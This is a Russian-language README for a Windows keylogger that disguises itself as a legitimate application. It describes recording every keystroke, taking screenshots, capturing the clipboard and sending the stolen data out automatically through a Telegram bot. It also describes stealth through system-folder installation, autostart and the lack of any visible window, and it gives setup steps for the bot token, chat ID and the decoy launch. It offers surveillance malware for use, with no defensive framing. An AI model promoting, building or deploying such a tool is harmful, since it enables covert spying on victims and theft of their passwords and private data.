## Описание проекта

Кейлоггер для Windows, который маскируется под легитимное приложение (`app.py`). При запуске основного приложения в фоновом режиме устанавливается и активируется система мониторинга.

### Функциональность

- **Кейлоггинг** - запись всех нажатых клавиш с определением раскладки
- **Скриншоты** - автоматическое создание снимков экрана:
  - По расписанию (настраиваемый интервал)
  - При смене активного окна
- **Мониторинг буфера обмена** - перехват текста и изображений
- **Автоотправка данных** - автоматическая отправка логов и медиафайлов через Telegram бота

## Технические особенности

### Отправка данных:
- Telegram бот для удаленного управления
- Автоматическая отправка лог-файлов
- Передача скриншотов и изображений из буфера обмена
- Настраиваемые интервалы отправки

### Скрытность:
- Установка в системные папки
- Автозапуск при старте системы
- Работа в фоновом режиме
- Отсутствие видимого интерфейса

## Установка и настройка

1. **Создание Telegram бота:**
   ```bash
   - Найти @BotFather в Telegram
   - Команда: /newbot
   - Получить токен бота
   - Узнать ваш chat_id через @userinfobot
   ```
   
2. **Клонирование репозитория**
    ``` bash
    git clone <url-репозитория>

    # Переход в директорию проекта
    cd keylogger
   ```
   
3. **Установка зависимостей**
    ```bash
   pip install -r requirements.txt
   ```

4. **Создание файла конфигурации**

    ```bash
    # Создаем новый .env файл
    notepad .env
    ```
   
    Содержимое .env файла:
    
    ```bash
    BOT_TOKEN=your_telegram_bot_token_here
    CHAT_ID=your_telegram_chat_id_here
    ```
   
5. **Запуск**

    ```bash
    python main.pyw
   
   # Основное приложение (маскировка):
   python app.py
    ```
